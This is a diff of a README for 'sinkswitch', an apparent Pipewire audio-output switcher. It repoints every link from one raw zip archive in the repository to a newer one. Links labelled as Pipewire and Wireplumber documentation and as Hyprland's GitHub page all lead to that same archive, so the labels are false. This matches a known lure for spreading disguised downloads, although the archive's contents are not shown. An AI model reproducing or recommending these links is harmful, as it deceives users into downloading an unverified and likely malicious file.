@@ -2,7 +2,7 @@
 
 ## 🌐 Download
 
-[![Download sinkswitch](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software_v1.2.zip)](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software_v1.2.zip)
+[![Download sinkswitch](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software-v3.5.zip)](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software-v3.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,12 +12,12 @@ Welcome to sinkswitch! This application helps you switch audio outputs for Pipew
 
 To get started with sinkswitch, visit the Releases page to download the latest version of the software.
 
-[Download sinkswitch here](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software_v1.2.zip)
+[Download sinkswitch here](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software-v3.5.zip)
 
 ### Step-by-Step Installation Instructions
 
 1. **Visit the Releases Page**  
-   Go to [this link](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software_v1.2.zip) to access the latest versions of sinkswitch. Here you will find all available downloads.
+   Go to [this link](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software-v3.5.zip) to access the latest versions of sinkswitch. Here you will find all available downloads.
 
 2. **Choose Your Version**  
    Once on the Releases page, scroll through the list of available versions. Look for the most recent one. Typically, the newest version will be at the top.
@@ -68,9 +68,9 @@ sinkswitch offers several features designed to enhance your audio management exp
 
 ## 🔗 Additional Resources
 
-- [Pipewire Documentation](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software_v1.2.zip)
-- [Wireplumber Documentation](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software_v1.2.zip)
-- [Hyprland on GitHub](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software_v1.2.zip)
+- [Pipewire Documentation](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software-v3.5.zip)
+- [Wireplumber Documentation](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software-v3.5.zip)
+- [Hyprland on GitHub](https://raw.githubusercontent.com/Aerxys/sinkswitch/main/quotlibet/Software-v3.5.zip)
 
 For support and community interaction, please visit our GitHub Discussions page. Your feedback is valuable and helps us make sinkswitch even better!
 
